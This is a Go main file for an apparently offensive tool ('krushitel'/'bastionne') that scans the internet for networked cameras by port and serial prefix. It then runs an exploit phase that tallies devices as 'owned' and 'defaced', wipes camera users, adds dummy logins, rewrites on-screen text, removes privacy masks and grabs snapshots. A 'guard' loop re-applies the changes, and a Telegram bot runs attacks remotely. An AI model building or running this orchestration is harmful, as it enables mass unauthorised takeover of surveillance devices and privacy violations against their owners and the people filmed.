package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"krushitel/core/cloudip"
	"krushitel/core/config"
	"krushitel/core/exploit"
	"krushitel/core/fwd"
	"krushitel/core/geo"
	"krushitel/core/ironscan"
	"krushitel/core/scanner"
	"krushitel/core/tgbot"
	"krushitel/core/tui"
	"krushitel/core/update"
)

func cloudAlive() bool {
	return cloudip.Alive(fwd.MAIN_SERVER)
}

func formatDuration(s float64) string {
	if s < 0 {
		s = 0
	}
	sec := int(s)
	h := sec / 3600
	m := (sec % 3600) / 60
	sc := sec % 60
	if h > 0 {
		return fmt.Sprintf("%02d:%02d:%02d", h, m, sc)
	}
	return fmt.Sprintf("%02d:%02d", m, sc)
}

func resolveOutDir(outDir string) string {
	if outDir == "" {
		outDir = time.Now().Format("02-01-2006_15-04-05")
	}
	if !filepath.IsAbs(outDir) {
		clean := filepath.Clean(outDir)
		if clean != "results" && !strings.HasPrefix(clean, "results"+string(filepath.Separator)) {
			outDir = filepath.Join("results", outDir)
		}
	}
	return outDir
}

func csvField(s string) string {
	if strings.ContainsAny(s, ",\"\r\n") {
		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
	}
	return s
}

func runIronScan(inFile, outDir string, threads, port int) int {
	if port <= 0 {
		port = 37777
	}
	if threads <= 0 {
		threads = 16
	}

	var (
		targets []string
		err     error
		isFile  bool
	)
	if st, serr := os.Stat(inFile); serr == nil {
		if st.IsDir() {
			fmt.Fprintln(os.Stderr, "[!] err: path is a directory, not a file: "+inFile)
			return 2
		}
		isFile = true
		targets, err = ironscan.LoadTargets(inFile)
	} else {
		targets = ironscan.ParseTarget(inFile)
	}
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] err: %v\n", err)
		return 2
	}
	if len(targets) == 0 {
		fmt.Fprintln(os.Stderr, "[!] err: target list is empty")
		return 2
	}

	_ = isFile
	outDir = resolveOutDir(outDir)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		fmt.Fprintf(os.Stderr, "[!] err: mkdir %s: %v\n", outDir, err)
		return 2
	}
	logFile, err := os.OpenFile(filepath.Join(outDir, "log.txt"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] warn: log.txt: %v\n", err)
	}
	if logFile != nil {
		defer logFile.Close()
	}

	resFile, err := os.OpenFile(filepath.Join(outDir, "ironscan.csv"), os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] err: ironscan.csv: %v\n", err)
		return 2
	}
	bw := bufio.NewWriter(resFile)
	defer func() { _ = bw.Flush(); _ = resFile.Close() }()
	_, _ = bw.WriteString("host,port,serial,model,firmware\n")
	_ = bw.Flush()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)
	go func() {
		<-sigCh
		cancel()
	}()

	fmt.Printf("[%s] ironscan: %d targets, port %d, threads %d\n",
		time.Now().Format("15:04"), len(targets), port, threads)

	start := time.Now()
	var found int64
	logLine := func(line string) {
		fmt.Println(line)
		if logFile != nil {
			fmt.Fprintf(logFile, "[%s] %s\n", time.Now().Format("15:04:05"), line)
			_ = logFile.Sync()
		}
	}

	var hits []ironscan.Result
	err = ironscan.Run(ctx, ironscan.Options{
		Targets:     targets,
		Port:        port,
		Timeout:     5 * time.Second,
		Concurrency: threads,
		Retries:     2,
	}, func(res ironscan.Result) {
		if res.Serial == "" {
			return
		}
		host, p := res.Target, strconv.Itoa(port)
		if h, pp, e := net.SplitHostPort(res.Target); e == nil {
			host, p = h, pp
		}
		model := res.Model
		if model == "" {
			model = "-"
		}
		fmt.Fprintf(bw, "%s,%s,%s,%s,%s\n",
			csvField(host), p, csvField(res.Serial), csvField(model), csvField(res.Firmware))
		_ = bw.Flush()
		hits = append(hits, res)
		logLine(fmt.Sprintf("%s SN: %s model: %s", net.JoinHostPort(host, p), res.Serial, model))
		atomic.AddInt64(&found, 1)
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] err: %v\n", err)
		return 1
	}

	seenSN := make(map[string]struct{}, len(hits))
	seenP := make(map[string]struct{}, len(hits))
	serials := make([]string, 0, len(hits))
	prefixes := make([]string, 0, len(hits))
	for _, h := range hits {
		if _, ok := seenSN[h.Serial]; ok {
			continue
		}
		seenSN[h.Serial] = struct{}{}
		if h.Model != "" {
			serials = append(serials, h.Serial+";"+h.Model)
		} else {
			serials = append(serials, h.Serial)
		}
		if len(h.Serial) >= 10 {
			p := h.Serial[:10]
			if _, ok := seenP[p]; !ok {
				seenP[p] = struct{}{}
				prefixes = append(prefixes, p)
			}
		}
	}
	if len(serials) > 0 {
		_ = os.WriteFile(filepath.Join(outDir, "serials.txt"),
			[]byte(strings.Join(serials, "\n")+"\n"), 0644)
	}
	if len(prefixes) > 0 {
		_ = os.WriteFile(filepath.Join(outDir, "prefix.txt"),
			[]byte(strings.Join(prefixes, "\n")+"\n"), 0644)
	}

	fmt.Printf("[%s] ironscan done: found %d in %s\n",
		time.Now().Format("15:04"), atomic.LoadInt64(&found), formatDuration(time.Since(start).Seconds()))
	if ctx.Err() != nil {
		return 130
	}
	return 0
}

func isAuxMode(mode string) bool {
	switch mode {
	case "titles", "clean", "guard", "masks":
		return true
	}
	return false
}

func runAuxMode(mode, inFile, outDir string, threads, interval int, frame, unmask bool, cfg config.Settings) int {
	cams, skipped, err := exploit.ParseResultsCreds(inFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] err: %v\n", err)
		return 2
	}
	if len(cams) == 0 {
		fmt.Fprintln(os.Stderr, "[!] err: no valid creds in file (SN,login,pass)")
		if prefixes, _, lerr := exploit.LoadTargetInput(inFile); lerr == nil && len(prefixes) > 0 {
			fmt.Fprintf(os.Stderr, "[*] hint: %s looks like a prefix list; scan it first: bastionne -i %s\n", inFile, inFile)
		}
		return 2
	}
	if skipped > 0 {
		fmt.Printf("[*] lines skipped as malformed: %d\n", skipped)
	}
	if mode == "masks" && !frame && !unmask {
		fmt.Fprintln(os.Stderr, "[!] err: masks mode needs --frame and/or --unmask")
		return 2
	}
	if interval <= 0 {
		interval = 300
	}

	outDir = resolveOutDir(outDir)
	if !cloudAlive() {
		fmt.Fprintln(os.Stderr, "[!] NetErr: Timeout (easy4ip) | Check your internet connection")
		return 1
	}
	_ = os.MkdirAll(outDir, 0755)

	opts := exploit.Opts{
		OutDir:      outDir,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
		AntiWhite:   true,
		Unmask:      unmask,
	}
	if (mode == "titles" || mode == "guard") && !exploit.HasTitleTexts(opts) {
		fmt.Fprintln(os.Stderr, "[!] err: OSD texts are empty (config.toml: channel_text / custom_texts)")
		return 2
	}

	logFile, _ := os.OpenFile(filepath.Join(outDir, "log.txt"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if logFile != nil {
		defer logFile.Close()
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)
	go func() {
		<-sigCh
		cancel()
	}()

	fmt.Printf("[%s] mode: %s | cams: %d | threads: %d | out: %s\n",
		time.Now().Format("15:04"), mode, len(cams), threads, outDir)
	if mode == "guard" {
		fmt.Printf("[%s] guard interval: %s\n", time.Now().Format("15:04"),
			(time.Duration(interval) * time.Second).String())
	}

	events := make(chan string, 4096)
	doneEvents := make(chan struct{})
	go func() {
		defer close(doneEvents)
		for ev := range events {
			fmt.Println(ev)
			if logFile != nil {
				fmt.Fprintf(logFile, "[%s] %s\n", time.Now().Format("15:04:05"), strings.TrimPrefix(ev, "[FILE] "))
				_ = logFile.Sync()
			}
		}
	}()

	start := time.Now()
	code := 0

	switch mode {
	case "titles":
		st := &exploit.TitlesStats{}
		exploit.RunTitles(ctx, cams, threads, opts, st, events)
		close(events)
		<-doneEvents
		fmt.Printf("\n%s | titles done: %d/%d | failed: %d | offline: %d | results at %s\n",
			formatDuration(time.Since(start).Seconds()), st.Titled, st.Total, st.Failed, st.Offline, outDir)
		if st.ErrorMsg != "" {
			fmt.Fprintf(os.Stderr, "[!] %s\n", st.ErrorMsg)
			code = 1
		}

	case "clean":
		st := &exploit.CleanStats{}
		exploit.RunClean(ctx, cams, threads, opts, st, events)
		close(events)
		<-doneEvents
		fmt.Printf("\n%s | clean done: %d/%d | colors: %d | white covers: %d | unmasked: %d ch | failed: %d | offline: %d | results at %s\n",
			formatDuration(time.Since(start).Seconds()), st.Cleaned, st.Total, st.Colors, st.Covers, st.Unmasked, st.Failed, st.Offline, outDir)
		if st.ErrorMsg != "" {
			fmt.Fprintf(os.Stderr, "[!] %s\n", st.ErrorMsg)
			code = 1
		}

	case "masks":
		st := &exploit.MaskStats{}
		exploit.RunMasks(ctx, cams, threads, frame, unmask, st, events)
		close(events)
		<-doneEvents
		fmt.Printf("\n%s | masks done: %d/%d | failed: %d | offline: %d | results at %s\n",
			formatDuration(time.Since(start).Seconds()), st.Applied, st.Total, st.Failed, st.Offline, outDir)
		if st.ErrorMsg != "" {
			fmt.Fprintf(os.Stderr, "[!] %s\n", st.ErrorMsg)
			code = 1
		}

	case "guard":
		st := &exploit.TitlesStats{}
		exploit.RunGuard(ctx, cams, threads, interval, opts, st, events)
		close(events)
		<-doneEvents
		fmt.Printf("\n%s | guard stopped | results at %s\n", formatDuration(time.Since(start).Seconds()), outDir)
		code = 130
	}

	if ctx.Err() != nil && code == 0 {
		code = 130
	}
	return code
}

func runTGBot(cfg config.Settings, outRoot string, threads int, antiwhite bool) int {
	token := strings.TrimSpace(cfg.TgBotToken)
	if token == "" {
		fmt.Fprintln(os.Stderr, "[!] tgbot: tg_bot_token is empty (config.toml)")
		return 2
	}

	var chats []int64
	for _, raw := range cfg.TgChatIDs {
		id, err := strconv.ParseInt(strings.TrimSpace(raw), 10, 64)
		if err == nil {
			chats = append(chats, id)
		}
	}
	if len(chats) == 0 {
		fmt.Fprintln(os.Stderr, "[!] tgbot: tg_chat_ids is empty (config.toml)")
		fmt.Fprintln(os.Stderr, "[*] send /start to the bot, then put your chat id into tg_chat_ids")
		return 2
	}

	lock, lerr := os.OpenFile("tgbot.lock", os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)
	if lerr != nil {
		fmt.Fprintln(os.Stderr, "[!] tgbot: another instance is already running (tgbot.lock)")
		fmt.Fprintln(os.Stderr, "[*] if the process is dead, delete tgbot.lock and retry")
		return 2
	}
	fmt.Fprintf(lock, "%d", os.Getpid())
	lock.Close()
	defer os.Remove("tgbot.lock")

	if outRoot == "" {
		outRoot = "results"
	}
	_ = os.MkdirAll(outRoot, 0755)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigCh)
	go func() {
		<-sigCh
		cancel()
	}()

	fmt.Printf("[%s] tgbot: starting | chats: %d | threads: %d | out: %s\n",
		time.Now().Format("15:04"), len(chats), threads, outRoot)

	err := tgbot.Run(tgbot.Options{
		Ctx:     ctx,
		Token:   token,
		ChatIDs: chats,
		Threads: threads,
		OutRoot: outRoot,
		Opts: exploit.Opts{
			Snaps:           cfg.Snaps,
			XML:             cfg.XML,
			Titles:          cfg.Titles,
			ChanText:        cfg.ChannelText,
			CustomTexts:     cfg.CustomTexts[:],
			DummyLogin:      cfg.DummyLogin,
			DummyPass:       cfg.DummyPass,
			SkipProblematic: cfg.SkipShitty,
			WipeUsers:       cfg.WipeUsers,
			AntiWhite:       antiwhite,
		},
		Log: func(format string, args ...any) {
			fmt.Printf("[%s] %s\n", time.Now().Format("15:04:05"), fmt.Sprintf(format, args...))
		},
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] tgbot: %v\n", err)
		return 1
	}
	return 0
}

func runMain(isHeadless bool, inFile, outDir, mode string, threads, port int, fresh, checkUpdate, autoUpdate bool, interval int, frame, unmask, antiwhite bool) int {
	cfg := config.Get()
	config.ApplyLang()
	fwd.Debug = cfg.Debug
	scanner.Debug = cfg.Debug

	if mode == "ironscan" {
		return runIronScan(inFile, outDir, threads, port)
	}

	if mode == "tgbot" {
		return runTGBot(cfg, outDir, threads, antiwhite)
	}

	var upd *update.Release
	if autoUpdate {
		upd, _ = selfUpdateCheck(true, false)
	} else if checkUpdate {
		upd, _ = selfUpdateCheck(false, false)
	}

	if isAuxMode(mode) {
		return runAuxMode(mode, inFile, outDir, threads, interval, frame, unmask, cfg)
	}

	if mode != "tgbot" && !cloudAlive() {
		fmt.Fprintln(os.Stderr, "[!] NetErr: Timeout (easy4ip) | Check your internet connection")
		return 1
	}

	geoDB := strings.TrimSpace(os.Getenv("KRUSH_GEO_DB"))
	if geoDB == "" {
		geoDB = strings.TrimSpace(cfg.GeoDB)
	}
	if geoDB != "" {
		if st, err := os.Stat(geoDB); err != nil || st.Size() == 0 {
			dbURL := strings.TrimSpace(os.Getenv("KRUSH_GEO_DB_URL"))
			if dbURL == "" {
				dbURL = strings.TrimSpace(cfg.GeoDBURL)
			}
			fmt.Printf("[*] downloading %s...\n", filepath.Base(geoDB))
			dctx, dcancel := context.WithTimeout(context.Background(), 2*time.Minute)
			_ = geo.EnsureDB(dctx, geo.FetchOptions{
				Path: geoDB,
				URL:  dbURL,
			})
			dcancel()
		}
	}

	cfgPath := "config.toml"
	if abs, err := filepath.Abs("config.toml"); err == nil {
		cfgPath = abs
	}

	prefixes, direct, lerr := exploit.LoadTargetInput(inFile)
	if lerr != nil {
		fmt.Fprintf(os.Stderr, "[!] err: %v\n", lerr)
		return 2
	}

	_, isFile := os.Stat(inFile)
	_ = isFile
	outDir = resolveOutDir(outDir)
	_ = os.MkdirAll(outDir, 0755)

	if mode == "exploit" {
		rememberIn := inFile
		if st, err := os.Stat(inFile); err == nil && !st.IsDir() {
			if abs, aerr := filepath.Abs(inFile); aerr == nil {
				rememberIn = abs
			}
		}
		rememberOut := outDir
		if abs, aerr := filepath.Abs(outDir); aerr == nil {
			rememberOut = abs
		}
		config.RememberRun(rememberIn, rememberOut, threads)
	}

	logFilePath := filepath.Join(outDir, "log.txt")
	logFile, _ := os.OpenFile(logFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if logFile != nil {
		defer logFile.Close()
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var ctrlCCount int32

	if isHeadless {
		return runHeadless(ctx, cancel, &ctrlCCount, cfg, cfgPath, inFile, outDir, mode, threads, port, fresh, prefixes, direct, logFile, upd, antiwhite)
	}
	return runTUI(ctx, cancel, &ctrlCCount, cfg, cfgPath, inFile, outDir, mode, threads, port, fresh, prefixes, direct, logFile, upd, antiwhite)
}

func headlessProgress(tp *exploit.TwoPhaseStats) (int, int64, int64) {
	phase := tp.PhaseNum()
	if phase == 0 {
		phase = 1
	}
	if phase >= 2 {
		return phase, atomic.LoadInt64(&tp.Exp.Processed), tp.Exp.Total
	}
	return phase, atomic.LoadInt64(&tp.Scan.Checked), atomic.LoadInt64(&tp.Scan.Total)
}

func headlessProgressLabel(tp *exploit.TwoPhaseStats, started time.Time) string {
	phase, done, total := headlessProgress(tp)
	label := fmt.Sprintf("p%d: %d/?", phase, done)
	if total > 0 {
		label = fmt.Sprintf("p%d: %d/%d (%.1f%%)", phase, done, total, float64(done)*100/float64(total))
	}
	if secs := time.Since(started).Seconds(); secs > 0 && done > 0 {
		label += fmt.Sprintf(" %.0f/s", float64(done)/secs)
	}
	return label
}

func runHeadless(ctx context.Context, cancel context.CancelFunc, ctrlCCount *int32,
	cfg config.Settings, cfgPath, inFile, outDir, mode string, threads, port int, fresh bool,
	prefixes, direct []string, logFile *os.File, upd *update.Release, antiwhite bool) int {

	nowStamp := time.Now().Format("15:04")
	ver := update.FullVersion()
	if ver == "" {
		ver = "0.1"
	}

	fmt.Printf("[%s] bastionne v%s\n", nowStamp, ver)
	fmt.Printf("Using config.toml at %s\n", cfgPath)
	fmt.Printf("Found %d prefixes | %d serials\n", len(prefixes), len(direct))
	fmt.Printf("Creating folder %s\n", outDir)
	if upd != nil {
		fmt.Printf("%s\n", updateLine(upd))
	}
	fmt.Println("Scan started")

	sigCh := make(chan os.Signal, 2)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		for range sigCh {
			c := atomic.AddInt32(ctrlCCount, 1)
			if c == 1 {
				fmt.Println("\n[!] Ctrl+C detected, shutting down cleanly...")
				cancel()
			} else {
				fmt.Println("\n[!!!] Double ctrl +c, force exit")
				os.Exit(130)
			}
		}
	}()

	startTime := time.Now()

	tp := &exploit.TwoPhaseStats{
		Scan: &scanner.ScanStats{},
		Exp:  &exploit.Stats{},
	}

	events := make(chan string, 4096)
	doneEvents := make(chan struct{})
	go func() {
		defer close(doneEvents)
		for ev := range events {
			if logFile != nil {
				stamp := time.Now().Format("15:04:05")
				fmt.Fprintf(logFile, "[%s] %s\n", stamp, strings.TrimPrefix(ev, "[FILE] "))
			}
		}
	}()

	scanDone := make(chan struct{})
	go func() {
		defer close(scanDone)
		exploit.RunPrefixExploit(ctx, prefixes, direct, outDir, threads, exploit.Opts{
			OutDir:          outDir,
			Snaps:           cfg.Snaps,
			XML:             cfg.XML,
			Titles:          cfg.Titles,
			ChanText:        cfg.ChannelText,
			CustomTexts:     cfg.CustomTexts[:],
			DummyLogin:      cfg.DummyLogin,
			DummyPass:       cfg.DummyPass,
			Resume:          !fresh,
			SkipProblematic: cfg.SkipShitty,
			WipeUsers:       cfg.WipeUsers,
			AntiWhite:       antiwhite,
		}, tp, events)
	}()

	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-scanDone:
			close(events)
			<-doneEvents
			elapsed := formatDuration(time.Since(startTime).Seconds())
			fnd := tp.FoundCount()
			owned := tp.Owned()
			snapsPos := atomic.LoadInt64(&tp.Exp.Snaps)
			snapsNeg := atomic.LoadInt64(&tp.Exp.SnapFails)
			geoSkip := atomic.LoadInt64(&tp.Scan.GeoFiltered)
			fmt.Printf("\r\x1b[2K%s | %s | found: %d | owned: %d | geo: %d | snap positive/negative: %d/%d | results at %s\n",
				elapsed, headlessProgressLabel(tp, startTime), fnd, owned, geoSkip, snapsPos, snapsNeg, outDir)
			if ctx.Err() != nil {
				return 130
			}
			return 0

		case <-ticker.C:
			elapsed := formatDuration(time.Since(startTime).Seconds())
			fnd := tp.FoundCount()
			owned := tp.Owned()
			snapsPos := atomic.LoadInt64(&tp.Exp.Snaps)
			snapsNeg := atomic.LoadInt64(&tp.Exp.SnapFails)
			geoSkip := atomic.LoadInt64(&tp.Scan.GeoFiltered)

			fmt.Printf("\r\x1b[2K%s | %s | found: %d | owned: %d | geo: %d | snap positive/negative: %d/%d | results at %s",
				elapsed, headlessProgressLabel(tp, startTime), fnd, owned, geoSkip, snapsPos, snapsNeg, outDir)
		}
	}
}

func runTUI(ctx context.Context, cancel context.CancelFunc, ctrlCCount *int32,
	cfg config.Settings, cfgPath, inFile, outDir, mode string, threads, port int, fresh bool,
	prefixes, direct []string, logFile *os.File, upd *update.Release, antiwhite bool) int {

	state := tui.NewState(cfgPath, cancel)
	state.SetOutDir(outDir)

	hasOSD := cfg.ChannelText != ""
	if !hasOSD {
		for _, ct := range cfg.CustomTexts {
			if strings.TrimSpace(ct) != "" {
				hasOSD = true
				break
			}
		}
	}
	hasGeo := len(cfg.GeoAllow) > 0 || len(cfg.GeoDeny) > 0

	state.SetRunSettings(tui.RunSettings{
		CfgPath:  cfgPath,
		OutDir:   outDir,
		GeoAllow: cfg.GeoAllow,
		GeoDeny:  cfg.GeoDeny,
		Tags: []tui.FeatureTag{
			{Name: "osdchanger", Enabled: hasOSD},
			{Name: "wipe_users", Enabled: cfg.WipeUsers},
			{Name: "snaps", Enabled: cfg.Snaps},
			{Name: "debug", Enabled: cfg.Debug},
			{Name: "geofence", Enabled: hasGeo},
		},
	})

	if upd != nil {
		state.SetUpdateLine(updateLine(upd))
	}

	scanner.PauseHook = func() bool { return state.IsPaused() }
	exploit.PauseHook = func() bool { return state.IsPaused() }
	exploit.OutcomeHook = func(serial string, pwned bool, defaced bool, method string) {
		tui.ReportOutcome(serial, pwned, defaced, method)
	}
	defer func() {
		scanner.PauseHook = nil
		exploit.PauseHook = nil
		exploit.OutcomeHook = nil
	}()

	state.AddLog("Loaded config.toml")
	state.AddLog(fmt.Sprintf("Loaded %s", filepath.Base(inFile)))
	state.AddLog(fmt.Sprintf("Created %s", outDir))

	tp := &exploit.TwoPhaseStats{
		Scan: &scanner.ScanStats{},
		Exp:  &exploit.Stats{},
	}

	events := make(chan string, 4096)
	doneEvents := make(chan struct{})
	go func() {
		defer close(doneEvents)
		for ev := range events {
			if strings.HasPrefix(ev, "[FILE] ") {
				if logFile != nil {
					stamp := time.Now().Format("15:04:05")
					fmt.Fprintf(logFile, "[%s] %s\n", stamp, strings.TrimPrefix(ev, "[FILE] "))
				}
				continue
			}
			state.AddLog(ev)
			if logFile != nil {
				stamp := time.Now().Format("15:04:05")
				fmt.Fprintf(logFile, "[%s] %s\n", stamp, ev)
			}
		}
	}()

	startTime := time.Now()

	go func() {
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				elapsedSec := time.Since(startTime).Seconds()
				p := tp.PhaseNum()
				if p == 1 || (p == 0 && len(prefixes) > 0) {
					pDone := atomic.LoadInt64(&tp.Scan.Checked)
					pTot := atomic.LoadInt64(&tp.Scan.Total)
					if pTot <= 0 {
						pTot = int64(len(prefixes)) * 1048576
					}
					sp := 0.0
					if elapsedSec > 0 {
						sp = float64(pDone) / elapsedSec
					}
					elapsed := formatDuration(elapsedSec)
					timeInfo := elapsed
					if sp > 0 && pTot > pDone {
						eta := formatDuration(float64(pTot-pDone) / sp)
						timeInfo = fmt.Sprintf("%s | ETA %s", elapsed, eta)
					}
					state.UpdateProgress(pDone, pTot, sp, timeInfo, "")
					state.SetCounterLabels("bastionned:", "offline:", "online:")
					state.SetCounters(tp.Owned(), atomic.LoadInt64(&tp.Scan.Dead), atomic.LoadInt64(&tp.Scan.Alive))
				} else {
					pDone := atomic.LoadInt64(&tp.Exp.Processed)
					pTot := tp.Exp.Total
					if pTot <= 0 && len(direct) > 0 {
						pTot = int64(len(direct))
					}
					sp := 0.0
					if elapsedSec > 0 {
						sp = float64(pDone) / elapsedSec
					}
					elapsed := formatDuration(elapsedSec)
					timeInfo := elapsed
					if sp > 0 && pTot > pDone {
						eta := formatDuration(float64(pTot-pDone) / sp)
						timeInfo = fmt.Sprintf("%s | ETA %s", elapsed, eta)
					}
					state.UpdateProgress(pDone, pTot, sp, timeInfo, "")
					state.SetCounterLabels("bastionned:", "failed:", "added:")
					state.SetCounters(tp.Owned(), atomic.LoadInt64(&tp.Exp.Failed), atomic.LoadInt64(&tp.Exp.Added))
				}
			}
		}
	}()

	scanDone := make(chan struct{})
	go func() {
		defer close(scanDone)
		exploit.RunPrefixExploit(ctx, prefixes, direct, outDir, threads, exploit.Opts{
			OutDir:          outDir,
			Snaps:           cfg.Snaps,
			XML:             cfg.XML,
			Titles:          cfg.Titles,
			ChanText:        cfg.ChannelText,
			CustomTexts:     cfg.CustomTexts[:],
			DummyLogin:      cfg.DummyLogin,
			DummyPass:       cfg.DummyPass,
			Resume:          !fresh,
			SkipProblematic: cfg.SkipShitty,
			WipeUsers:       cfg.WipeUsers,
			AntiWhite:       antiwhite,
		}, tp, events)

		close(events)
		<-doneEvents
		state.SetFinished(0)
	}()

	exitCode := tui.Run(state, false)
	cancel()
	<-scanDone
	return exitCode
}
